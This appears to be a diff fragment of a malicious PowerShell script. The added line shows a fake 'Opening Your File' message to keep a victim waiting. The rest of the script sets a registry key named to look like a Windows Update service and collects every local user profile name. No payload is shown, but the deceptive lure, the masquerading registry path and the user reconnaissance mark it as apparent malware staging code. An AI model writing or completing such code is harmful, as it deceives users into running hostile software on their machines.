@@ -1,3 +1,4 @@
+Write-Host "Opening Your File, Please Don't Close this window" -ForegroundColor Yellow -BackgroundColor Black
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $userNamesRaw = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
 $userNamesClean = $userNamesRaw -join ' | '
